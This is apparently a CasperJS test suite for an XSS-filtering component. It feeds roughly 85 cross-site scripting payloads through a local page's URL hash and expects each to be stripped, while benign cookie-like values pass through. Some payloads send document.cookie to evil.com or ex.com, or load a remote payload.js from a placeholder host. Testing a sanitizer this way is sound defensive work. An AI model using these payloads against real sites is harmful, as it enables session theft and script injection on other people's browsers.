/* global casper: false, location: false */
/* eslint-disable no-script-url*/
'use strict';

var path = 'http://localhost:9000/tmp/samples/xssprotector/xss-tests.html';

var tests = [
    
    /*
     * HTML context
     */
    {
        'name': 'HTML-based context test #1',
        'payload': '<script>alert(1)</script>',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #2',
        'payload': '<script>alert(1)</script',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #3',
        'payload': '<svg/onload=alert(1)>',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #4',
        'payload': 'bold"><img src=x onerror=alert(1)>',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #5',
        'payload': '<img src="javascript:alert(1)">',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #6',
        'payload': '<img src=1 onerror=alert(1) width=1>',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #7',
        'payload': '<img src=1 onerror=alert(1) width=1><s>test',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #8',
        'payload': '<img src=1 width=1>',
        'expected': '%3Cimg%20src=1%20width=1%3E'
    },
    {
        'name': 'HTML-based context test #9',
        'payload': '%3Cimg%20src%3D%22data%3Aimage%2Fpng%3Bbase64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4%2F%2F8%2Fw38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg%3D%3D%22%20alt%3D%22Red%20dot%22%20%2F%3E',
        'expected': '%3Cimg%20src%3D%22data%3Aimage%2Fpng%3Bbase64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4%2F%2F8%2Fw38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg%3D%3D%22%20alt%3D%22Red%20dot%22%20%2F%3E'
    },
    {
        'name': 'HTML-based context test #10',
        'payload': 'prettyPhoto[i]/x,<svg/onload=alert(document.domain)>/x',
        'expected': ''
    },
    {
        'name': 'HTML-based context test #11',
        'payload': 'prettyPhoto[gallery]/1,<a onclick="alert(document.domain);">/',
        'expected': ''
    },
    {
        'name': 'HTML-based context #12',
        'payload': '<a href="vbscript:alert(1)>click me</a>">',
        'expected': ''
    },
    {
        'name': 'HTML-based context #13',
        'payload': '<a href="barbazfoo://evil.com">click me</a>',
        'expected': ''
    },
    {
        'name': 'HTML-based context #14',
        'payload': '<a href="http://evil.com">click me</a>',
        'expected': ''
    },
    {
        'name': 'HTML-based context #15',
        'payload': '<svg><a xlink:href="http://evil.com/"><circle r=40></a></svg>',
        'expected': ''
    },
    {
        'name': 'HTML-based context #16',
        'payload': '<math href="http://evil.com/">CLICKME</math>',
        'expected': ''
    },
    {
        'name': 'HTML-based context #17',
        'payload': '<form action="http://evil.com/"><input type="submit"></form>',
        'expected': ''
    },
    {
        'name': 'HTML-based context #18',
        'payload': '<map name="test"><area href="http://evil.com/" shape="rect" coords="0,0,200,200"></area></map>',
        'expected': ''
    },
    /*
     * URL-based context
     */
    {
        'name': 'URL-based context #1',
        'payload': 'javascript:alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #2',
        'payload': ' javascript:alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #3',
        'payload': 'javascript&colon;alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #4',
        'payload': 'javascript&#x3A;alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #5',
        'payload': 'j&#x61;v&#x41;sc&#x52;ipt&#x3A;alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #6',
        'payload': 'j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;',
        'expected': ''
    },
    {
        'name': 'URL-based context #7',
        'payload': 'feed:javascript:alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #8',
        'payload': 'feed:javascript&colon;alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #9',
        'payload': 'feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e',
        'expected': ''
    },
    {
        'name': 'URL-based context #10',
        'payload': 'feed:data:text/html,%3csvg%20onload=alert%281%29%3e',
        'expected': ''
    },
    {
        'name': 'URL-based context #11',
        'payload': 'data:text/html,%3Cscript%3Ealert(1)%3C/script%3E',
        'expected': ''
    },
    {
        'name': 'URL-based context #12',
        'payload': 'd&#x61;t&#x61;&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #13',
        'payload': 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #14',
        'payload': 'javascript:',
        'expected': ''
    },
    {
        'name': 'URL-based context #15',
        'payload': 'javascript%26amp%3Bamp%3Bcolon%3Balert(2)',
        'expected': ''
    },

    {
        'name': 'URL-based context #16',
        'payload': 'javascript%3A\u0061lert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #17',
        'payload': 'vbscript%3A\u0061lert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context #18',
        'payload': 'javascript:&NewLine;alert(39)',
        'expected': ''
    },
    {
        'name': 'URL-based context #19',
        'payload': 'data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+',
        'expected': ''
    },
    {
        'name': 'URL-based context #20',
        'payload': 'javascript:javascript:alert(41)',
        'expected': ''
    },
    {
        'name': 'URL-based context #21',
        'payload': 'javascript&colon;a&#x6C;&#101rt(42)',
        'expected': ''
    },
    {
        'name': 'URL-based context #22',
        'payload': 'javascript&colon;a&#x6C;&#101rt(43)> ',
        'expected': ''
    },
    {
        'name': 'URL-based context #23',
        'payload': 'jav&#x09;as&#x0A;cript&#x0D;:alert(44)',
        'expected': ''
    },
    {
        'name': 'URL-based context #24',
        'payload': 'jav&#x000009;as&#x00000A;cript&#x00000D;:alert(45)',
        'expected': ''
    },
    {
        'name': 'URL-based context #25',
        'payload': '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(46)',
        'expected': ''
    },
    {
        'name': 'URL-based context #26',
        'payload': '&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116:alert(47)',
        'expected': ''
    },
    {
        'name': 'URL-based context #27',
        'payload': '&#0000106&#000097&#0000118&#000097&#0000115&#000099&#0000114&#0000105&#0000112&#0000116:alert(48)',
        'expected': ''
    },
    {
        'name': 'URL-based context #28',
        'payload': 'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #29',
        'payload': '&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12&NewLine;javascript:alert(50)',
        'expected': ''
    },
    {
        'name': 'URL-based context #30',
        'payload': 'data:,alert(51)',
        'expected': ''
    },
    {
        'name': 'URL-based context #31',
        'payload': 'data:text/plain,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==',
        'expected': 'data:text/plain,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=='
    },
    {
        'name': 'URL-based context #32',
        'payload': 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #33',
        'payload': 'd&#x61;t&#x61;&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #34',
        'payload': 'data:text/html;base64wakemeupbeforeyougogo,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #35',
        'payload': 'data:text/html:       ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context #36',
        'payload': 'data:text/html;base64,,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    /*
     * Attribute-based context tests.
     */
    {
        'name': 'Attribute-based context #1',
        'payload': '" onload="alert(1)',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #2',
        'payload': "' onload='alert(1)",
        'expected': ''
    },
    {
        'name': 'Attribute-based context #3',
        'payload': 'onload=a;a=1;alert(1)',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #4',
        'payload': 'x%20onload=alert(1)',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #5',
        'payload': 'x"onload=alert(1)"',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #6',
        'payload': 'x" onload="alert(1)',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #7',
        'payload': 'x\nonload=aaa=alert(1)',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #8',
        'payload': 'onload = "x=alert(1)"',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #9',
        'payload': 'x/onload = "x=alert(1)"',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #10',
        'payload': 'onload=alert(1)',
        'expected': ''
    },
    {
        'name': 'Attribute-based context #13',
        'payload': 'onmouseover=alert("xss")',
        'expected': ''
    },
    {
        'name': 'OSX Message XSS',
        'payload': '%0A%28function%28s%29%7Bs.src%3D%27http%3A%2f%2fyourhostname%3A8888%2ff%2fpayload.js%27%3Bdocument.body.appendChild%28s%29%7D%29%28document.createElement%28%27script%27%29%29',
        'expected': ''
    },
    {
        'name': 'CTF writeup #1',
        'payload': '<a href="javascript:location=\'http://ex.com/\'%2bdocument.cookie" onclick="">',
        'expected': ''
    },
    {
        'name': 'CTF writeup #2',
        'payload': 'javascript:location=alert(1)',
        'expected': ''
    },
    /*
     * JS-based context tests.
     */
    {
        'name': 'JS-based context #1',
        'payload': '"};alert(1);var f={"t":"',
        'expected': ''
    },
    {
        'name': 'JS-based context #2',
        'payload': 'a=1;alert(1); var t',
        'expected': ''
    },
    {
        'name': 'JS-based context #3',
        'payload': ';/**/alert(1);//',
        'expected': ''
    },
    {
        'name': 'JS-based context #4',
        'payload': 'var script = document.createElement("script"); script.type = "text/javascript"; script.src = url;document.getElementsByTagName("head")[0].appendChild(script);a=',
        'expected': ''
    },
    {
        'name': 'JS-based context #5',
        'payload': 'var script = document.createElement("script"); script.type = "text/javascript"; script.src = url;document.getElementsByTagName("head")[0].appendChild(script);a=',
        'expected': ''
    },
    {
        'name': 'JS-based context #6',
        'payload': 'alert(1)',
        'expected': ''
    },
    {
        'name': 'JS-based context #7',
        'payload': "'});alert(1);var f=({t:'",
        'expected': ''
    },
    {
        'name': 'JS-based context #8',
        'payload': '"});alert(1);var f=({t:"',
        'expected': ''
    },
    {
        'name': 'JS-based context #9',
        'payload': ');alert(1);foo(',
        'expected': ''
    },
    {
        'name': 'JS-based context #10',
        'payload': "');alert(1);foo('",
        'expected': ''
    },
    {
        'name': 'JS-based context #11',
        'payload': '");alert(1);foo("',
        'expected': ''
    },
    {
        'name': 'JS-based context #12',
        'payload': 'aa"}]};alert(1);var foo={"a":[{"bb":"cc"',
        'expected': ''
    },
    {
        'name': 'JS-based context #13',
        'payload': '*/if(1==1){//"));evilcode(1); /*',
        'expected': ''
    },
    {
        'name': 'JS-based context #14',
        'payload': 'aaa"}).init(); alert(1); require("page").setData({"type":"PAGE", "a":"aaaa',
        'expected': ''
    },
    {
        'name': 'JS-based context #15',
        'payload': "'-alert(1)-'",
        'expected': ''
    },
    {
        'name': 'JS-based context #16',
        'payload': '"-alert(1)-"',
        'expected': ''
    },
    {
        'name': 'JS-based context #17',
        'payload': 'a=1;alert(1);var t',
        'expected': ''
    },
    {
        'name': 'JS-based context #18',
        'payload': ';/**/alert(1);//',
        'expected': ''
    },
    {
        'name': 'JS-based context #19',
        'payload': '"});alert(1);var f=({',
        'expected': ''
    },
    {
        'name': 'JS-based context #20',
        'payload': '"-alert(1)-"',
        'expected': ''
    },
    {
        'name': 'JS-based context #21',
        'payload': '[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()',
        'expected': ''
    },
    {
        'name': 'JS-based context #22',
        'payload': 'location="javascript:alert(1)"',
        'expected': ''
    },
    {
        'name': 'JS-based context #23',
        'payload': 'location="vbscript:alert(1)"',
        'expected': ''
    },
    {
        'name': 'JS-based context #24',
        'payload': 'location="http://evil.com/cookie" + document.cookie',
        'expected': ''
    },
    /*
     * Normal data tests.
     */
    {
        'name': 'Normal data test #1',
        'payload': '[a=1]',
        'expected': '[a=1]'
    },
    {
        'name': 'Normal data test #2',
        'payload': '1111111111111111',
        'expected': '1111111111111111'
    },
    {
        'name': 'Normal data test #3',
        'payload': 'aaa=11111;secure;htponly',
        'expected': 'aaa=11111;secure;htponly'
    },
    {
        'name': 'Normal data test #4',
        'payload': 'aaa=1',
        'expected': 'aaa=1'
    },
    {
        'name': 'Normal data test #5',
        'payload': 'aaa=bbb=111',
        'expected': 'aaa=bbb=111'
    },
    {
        'name': 'Normal data test #6',
        'payload': "'aaaaaaaaaaa'",
        'expected': "'aaaaaaaaaaa'"
    },
    {
        'name': 'Normal data test #7',
        'payload': '"aaaaaaaaaaa"',
        'expected': '%22aaaaaaaaaaa%22'
    },
    {
        'name': 'Normal data test #8',
        'payload': 'index.html',
        'expected': 'index.html'
    },
    {
        'name': 'Normal data test #9',
        'payload': '150763447.1860448730.1445593431.1446723513.1446723513.1',
        'expected': '150763447.1860448730.1445593431.1446723513.1446723513.1'
    },
    {
        'name': 'Normal data test #10',
        'payload': 'ID=63a03e24d94f3c99:T=1447055848:S=ALNI_Mad71OKEsNLD5woUsaYY5FKEoriHA',
        'expected': 'ID=63a03e24d94f3c99:T=1447055848:S=ALNI_Mad71OKEsNLD5woUsaYY5FKEoriHA'
    },
    {
        'name': 'Normal data test #11',
        'payload': 'key=thetradedesk:value=35044c17-ff3f-483a-ba31-df375587deeb:expiresAt=Sat+Nov+21+23%3A09%3A36+PST+2015:32-Compatible=true',
        'expected': 'key=thetradedesk:value=35044c17-ff3f-483a-ba31-df375587deeb:expiresAt=Sat+Nov+21+23%3A09%3A36+PST+2015:32-Compatible=true'
    },
    {
        'name': 'Normal data test #12',
        'payload': '/clck/jclck/reqid=1450762152102821-1591-V/rnd=14/yuid=84222/path=13.4/dtype=iweb/*http://yandex.ru/video/',
        'expected': '/clck/jclck/reqid=1450762152102821-1591-V/rnd=14/yuid=84222/path=13.4/dtype=iweb/*http://yandex.ru/video/'
    },
    {
        'name': 'Normal data test #13',
        'payload': '{"reaction":"ack","parsed":true,"server_notify_id":"p4f0QMXfsKo1:o4fhlo9HASw1:daria:mail"}',
        'expected': '%7B%22reaction%22:%22ack%22,%22parsed%22:true,%22server_notify_id%22:%22p4f0QMXfsKo1:o4fhlo9HASw1:daria:mail%22%7D'
    },
    {
        'name': 'Normal data test #14',
        'payload': 'this is a table',
        'expected': 'this%20is%20a%20table'
    },
    {
        'name': 'Normal data test #15',
        'payload': '{"data":[28,0,201,8,187,7,201,8,187,7]}',
        'expected': '%7B%22data%22:[28,0,201,8,187,7,201,8,187,7]%7D'
    },
    {
        'name': 'Normal data test #16',
        'payload': "{'data':[28,0,201,8,187,7,201,8,187,7]}",
        'expected': "%7B'data':[28,0,201,8,187,7,201,8,187,7]%7D"
    },
    {
        'name': 'Normal data test #17',
        'payload': '{}',
        'expected': '%7B%7D'
    },
    {
        'name': 'Normal data test #18',
        'payload': '134479a8-e8ab-4de8-b1ed-bdbb37eb1364',
        'expected': '134479a8-e8ab-4de8-b1ed-bdbb37eb1364'
    },
    {
        'name': 'Normal data test #19',
        'payload': '1000-1000-1000',
        'expected': '1000-1000-1000'
    },
    {
        'name': 'Normal data test #20',
        'payload': 'true',
        'expected': 'true'
    },
    {
        'name': 'Normal data test #21',
        'payload': '[]',
        'expected': '[]'
    },
    {
        'name': 'Normal data test #22',
        'payload': '0,1,123123123,false',
        'expected': '0,1,123123123,false'
    },
    {
        'name': 'Normal data test #23',
        'payload': '{"nrt":1462971105441,"nrt-e":1462971105441,"nrt-r":17520000}',
        'expected': '%7B%22nrt%22:1462971105441,%22nrt-e%22:1462971105441,%22nrt-r%22:17520000%7D'
    },
    {
        'name': 'Normal data test #24',
        'payload': 'gmail=A-B',
        'expected': 'gmail=A-B'
    },
    {
        'name': 'Normal data test #25',
        'payload': 'a=b=c',
        'expected': 'a=b=c'
    },
    {
        'name': 'Normal data test #26',
        'payload': 'a=c3:TM=1222:C=c:IP=1.1.1.1-:S=AB',
        'expected': 'a=c3:TM=1222:C=c:IP=1.1.1.1-:S=AB'
    },
    {
        'name': 'Normal data test #27',
        'payload': 'http://example.com/foo?a=1&b=2',
        'expected': 'http://example.com/foo?a=1&b=2'
    },
    {
        'name': 'Normal data test #28',
        'payload': 'foo=http://example.com/foo?a=1&b=2',
        'expected': 'foo=http://example.com/foo?a=1&b=2'
    },
    {
        'name': 'Normal data test #29',
        'payload': 'GA1.1.11233335445.345236546',
        'expected': 'GA1.1.11233335445.345236546'
    },
    {
        'name': 'Normal data test #30',
        'payload': 'aaaa',
        'expected': 'aaaa'
    },
    {
        'name': 'Normal data test #31',
        'payload': 'aaa=bbb=111',
        'expected': 'aaa=bbb=111'
    },
    {
        'name': 'Normal data test #32',
        'payload': '150763447.1860448730.1445593431.1446723513.1446723513.1',
        'expected': '150763447.1860448730.1445593431.1446723513.1446723513.1'
    },
    {
        'name': 'Normal data test #33',
        'payload': '/aa/bb/cc',
        'expected': '/aa/bb/cc'
    },
    {
        'name': 'Normal data test #34',
        'payload': '1234567890',
        'expected': '1234567890'
    }
];

casper.test.begin('XSS via hash tests', tests.length, function suite(test) {
    casper.start();
    // eslint-disable-next-line no-unused-vars
    tests.forEach(function(t) {
        casper.thenOpen(path + '#' + t.payload, function() {
            test.assertEquals(this.evaluate(function() {
                return location.hash.substring(1);
            }), t.expected, t.name);
        });
    });
    casper.run(function() {
        test.done();
    });
});
